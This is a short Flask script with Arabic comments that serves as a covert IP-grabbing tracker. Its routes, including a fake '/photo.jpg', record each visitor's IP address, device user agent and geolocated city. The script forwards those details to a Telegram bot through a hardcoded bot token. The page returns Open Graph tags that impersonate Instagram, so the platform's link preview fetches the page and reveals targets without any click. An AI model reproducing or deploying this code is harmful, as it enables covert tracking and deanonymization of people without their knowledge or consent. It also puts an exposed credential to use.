from flask import Flask, request
import requests

app = Flask(__name__)

# إعداداتك الأصلية التي تعمل 100%
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/check-status')
@app.route('/photo.jpg') # هذا المسار مهم جداً
def track():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')

    # جلب معلومات الموقع
    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        location = f"{geo_res.get('city')}, {geo_res.get('country')}"
    except:
        location = "Error"

    report = (
        f"🎯 <b>تنبيه صيد (بدون ضغط)!</b>\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {location}\n"
        f"📱 <b>الجهاز:</b> {user_agent}\n"
    )
    send_to_telegram(report)
    
    # السر هنا: إرجاع وسوم تجعل انستقرام يثق بالرابط ويحمله مسبقاً
    return """
    <html>
    <head>
        <meta property="og:title" content="Verified Content">
        <meta property="og:type" content="video.other"> <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:url" content="https://www.instagram.com">
    </head>
    <body><h1>404 Not Found</h1></body>
    </html>
    """, 200

if __name__ == '__main__':
    app.run()
